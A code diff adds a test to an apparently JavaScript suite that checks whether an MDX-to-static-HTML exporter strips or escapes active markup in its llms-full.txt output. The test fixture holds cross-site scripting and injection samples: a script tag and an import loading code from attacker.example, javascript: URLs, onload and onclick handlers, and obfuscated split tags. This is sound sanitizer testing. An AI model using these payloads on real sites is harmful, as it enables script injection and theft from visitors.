@@ -201,6 +201,63 @@ describe('export renderers', () => {
     expect(rootFull).not.toContain('<script>');
   });
 
+  it('drops active MDX and escapes retained authored markup in machine-readable files', () => {
+    const page = {
+      ...required(snapshot.pages[0]),
+      content: `# Safe
+
+Before <ScRiPt src="https://attacker.example/x.js">stolen
+<iframe>nested</iframe></sCrIpT> after.
+
+<object data="javascript:run()">object payload</object>
+<embed src="https://attacker.example" /> after embed
+
+<custom onclick="run()">Readable</custom>
+<svg onload="run()"><a href="javascript:run()">svg link</a></svg>
+<math href="javascript:run()">math link</math>
+
+import Exploit from "https://attacker.example/exploit.js"
+export const payload = run()
+Before expression {globalThis.stolen({ nested: true })} after expression.
+
+<Callout type="tip">**Portable guidance**</Callout>
+<RelatedContent title="Continue"><RelatedCard title="Setup" href="/setup" /></RelatedContent>
+
+<STYLE>unclosed style
+
+\`\`\`html
+<script onclick="shownAsCode()">const example = { safe: true };</script>
+<svg onload="shownAsCode()"></svg>
+\`\`\`
+
+~~~mdx
+<Callout type="tip">Code sample</Callout>
+~~~
+
+&lt;scr<script>ipt&gt;crafted`,
+    };
+    const files = unzipSync(renderStaticHtml({ ...snapshot, pages: [page] }, assets).bytes);
+    const full = text(required(files['llms-full.txt']));
+
+    expect(full).toContain('Before  after.');
+    expect(full).toContain('&lt;custom onclick=&quot;run()&quot;&gt;Readable&lt;/custom&gt;');
+    expect(full).toContain('&lt;svg onload=&quot;run()&quot;&gt;');
+    expect(full).toContain('&lt;math href=&quot;javascript:run()&quot;&gt;math link&lt;/math&gt;');
+    expect(full).toContain('&amp;lt;scr');
+    expect(full).toContain('&gt; **Portable guidance**');
+    expect(full).toContain('## Continue');
+    expect(full).toContain('[Setup](/setup)');
+    expect(full).toContain('Before expression  after expression.');
+    expect(full).toContain(
+      '```html\n<script onclick="shownAsCode()">const example = { safe: true };</script>\n<svg onload="shownAsCode()"></svg>\n```',
+    );
+    expect(full).toContain('~~~mdx\n<Callout type="tip">Code sample</Callout>\n~~~');
+    expect(full).not.toMatch(/stolen|nested|object payload|unclosed style|crafted|Exploit|payload = run/);
+    const prose = full.replace(/```[\s\S]*?```|~~~[\s\S]*?~~~/g, '');
+    expect(prose).not.toMatch(/<\/?(?:script|style|iframe|object|embed|svg|math)\b/i);
+    expect(prose).not.toMatch(/<[a-z][^>]*\son(?:click|load)\s*=/i);
+  });
+
   it('keeps private, noindex, and externally canonicalized pages out of discovery files', () => {
     const restrictedPages = [
       { ...required(snapshot.pages[0]), config: { seo: { noindex: true } } },
